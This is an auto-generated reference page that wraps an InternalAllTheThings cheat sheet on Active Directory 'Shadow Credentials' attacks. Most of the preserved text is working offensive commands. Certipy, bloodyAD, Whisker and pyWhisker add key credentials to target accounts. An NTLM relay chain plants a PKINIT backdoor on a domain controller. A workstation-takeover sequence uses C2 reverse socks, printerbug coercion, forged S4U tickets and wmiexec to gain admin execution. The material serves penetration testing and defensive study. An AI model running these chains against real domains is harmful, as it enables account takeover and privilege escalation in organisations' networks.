---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Password - Shadow Credentials

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-pwd-shadow-credentials` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-shadow-credentials.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Password - Shadow Credentials](../../topics/active-directory/password-shadow-credentials.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-pwd-shadow-credentials |
| name | Password - Shadow Credentials |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/pwd-shadow-credentials.md |

## Preserved Source Material

````yaml
_body: "# Password - Shadow Credentials\n\n> Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target\
  \ user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.\
  \  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching\
  \ private key, and a TGT will be sent if there is a match.\n\n:warning: User objects can't edit their own `msDS-KeyCredentialLink`\
  \ attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only\
  \ add a KeyCredential if none already exists\n\n**Requirements**:\n\n* Domain Controller on (at least) Windows Server 2016\n\
  * Domain must have Active Directory `Certificate Services` and `Certificate Authority` configured\n* PKINIT Kerberos authentication\n\
  * An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object\n\n**Exploitation**:\n\
  \n* [ly4k/Certipy](https://github.com/ly4k/Certipy)\n\n  ```ps1\n  certipy shadow auto -account user -dc-ip 10.10.10.10\
  \ -dns-tcp -ns 10.10.10.10 -k -no-pass -target dc.domain.lab\n  certipy shadow -u 'attacker@domain.local' -p 'Passw0rd!'\
  \ -dc-ip '10.0.0.100' -account 'victim' add\n  ```\n\n* [CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD):\n\
  \n  ```ps1\n  bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab add shadowCredentials targetpc$\n  bloodyAD\
  \ --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab remove shadowCredentials targetpc$ --key <key from previous\
  \ output>\n  ```\n\n* [eladshamir/Whisker](https://github.com/eladshamir/Whisker):\n\n  ```powershell\n  # Lists all the\
  \ entries of the msDS-KeyCredentialLink attribute of the target object.\n  Whisker.exe list /target:computername$\n\n  #\
  \ Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB\
  \ from a new device.\n  Whisker.exe add /target:\"TARGET_SAMNAME\" /domain:\"FQDN_DOMAIN\" /dc:\"DOMAIN_CONTROLLER\" /path:\"\
  cert.pfx\" /password:\"pfx-password\"\n  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local\
  \ /path:C:\\path\\to\\file.pfx /password:P@ssword1]\n\n  # Removes a key credential from the target object specified by\
  \ a DeviceID GUID.\n  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b\n\
  \  ```\n\n* [ShutdownRepo/pyWhisker](https://github.com/ShutdownRepo/pyWhisker):\n\n  ```ps1\n  # Lists all the entries\
  \ of the msDS-KeyCredentialLink attribute of the target object.\n  python3 pywhisker.py -d \"domain.local\" -u \"user1\"\
  \ -p \"complexpassword\" --target \"user2\" --action \"list\"\n\n  # Generates a public-private key pair and adds a new\
  \ key credential to the target object as if the user enrolled to WHfB from a new device.\n  pywhisker.py -d \"FQDN_DOMAIN\"\
  \ -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\"\n  python3 pywhisker.py -d \"domain.local\"\
  \ -u \"user1\" -p \"complexpassword\" --target \"user2\" --action \"add\" --filename \"test1\"\n\n  # Removes a key credential\
  \ from the target object specified by a DeviceID GUID.\n  python3 pywhisker.py -d \"domain.local\" -u \"user1\" -p \"complexpassword\"\
  \ --target \"user2\" --action \"remove\" --device-id \"a8ce856e-9b58-61f9-8fd3-b079689eb46e\"\n  ```\n\n## Scenario\n\n\
  ### Shadow Credential Relaying\n\n* Trigger an NTLM authentication from `DC01` (PetitPotam)\n* Relay it to `DC02` (ntlmrelayx)\n\
  * Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)\n* Alternatively : `ntlmrelayx\
  \ -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`\n\n### Workstation Takeover with RBCD\n\n**Requirements**:\n\
  \n* `Print Spooler` service running\n* `WebClient service` running\n\n**Exploitation**:\n\n* Using your C2, start a reverse\
  \ socks on port 1080: `socks 1080`\n* Enable port forward from port 8081 to 81 on the compromised machine:\n\n  ```ps1\n\
  \  rportfwd 8081 127.0.0.1 81\n  ```\n\n* Start the relay:\n\n  ```ps1\n  proxychains python3 ntlmrelayx.py -t ldaps://dc.domain.lab\
  \ --shadow-credentials --shadow-target target\\$ --http-port 81\n  ```\n\n* Trigger a callback on webdav:\n\n  ```ps1\n\
  \  proxychains python3 printerbug.py domain.lab/user:password@target.domain.lab compromised@8081/file\n  ```\n\n* Use [dirkjanm/PKINIT](https://github.com/dirkjanm/PKINITtools)\
  \ to get a TGT for the machine account:\n\n  ```ps1\n  proxychains python3 gettgtpkinit.py domain.lab/target\\$ target.ccache\
  \ -cert-pfx </path/from/previous/command.pfx> -pfx-pass <pfx-pass>\n  ```\n\n* Elevate your privileges by creating a service\
  \ ticket impersonating a local admin:\n\n  ```ps1\n  proxychains python3 gets4uticket.py kerberos+ccache://domain.lab\\\\\
  target\\$:target.ccache@dc.domain.lab cifs/target.domain.lab@domain.lab administrator@domain.lab administrator_target.ccache\
  \ -v\n  ```\n\n* Use your ticket:\n\n  ```ps1\n  export KRB5CCNAME=/path/to/administrator_target.ccache\n  proxychains python3\
  \ wmiexec.py -k -no-pass domain.lab/administrator@target.domain.lab\n  ```\n\n## References\n\n* [Shadow Credentials: Workstation\
  \ Takeover Edition - Matthew Creel - October 21, 2021](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)\n\
  * [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)\n* [Shadow\
  \ Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - June 17, 2021](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)"
_relative_path: active-directory/pwd-shadow-credentials.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/pwd-shadow-credentials.md
````
